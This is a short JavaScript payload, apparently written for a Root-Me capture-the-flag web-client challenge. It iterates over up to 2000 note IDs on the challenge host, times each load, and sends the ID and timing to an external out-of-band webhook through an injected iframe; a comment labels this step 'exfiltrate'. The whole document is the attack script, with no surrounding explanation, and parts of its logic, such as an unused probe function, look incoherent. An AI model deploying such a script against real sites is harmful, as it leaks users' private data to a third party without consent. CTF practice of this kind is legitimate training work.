<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";

let i = 0;
const MAX = 2000;

async function probe(id) {
    const start = performance.now();

    // navigate
    location.href = TARGET + id;

    // when page loads again, script runs again
}

// recover state
const params = new URLSearchParams(location.search);
const prev = params.get("p");
const start = params.get("t");

if (prev !== null && start !== null) {
    const delta = performance.now() - parseFloat(start);

    console.log("ID:", prev, "TIME:", delta);

    // exfiltrate
    const ex = document.createElement("iframe");
    ex.src = WEBHOOK + "?id=" + prev + "&t=" + delta;
    document.documentElement.appendChild(ex);

    i = parseInt(prev) + 1;
} else {
    i = 0;
}

// continue loop
if (i < MAX) {
    const nextStart = performance.now();

    location.href =
        TARGET +
        i +
        "?p=" + i +
        "&t=" + nextStart;
}
</script>
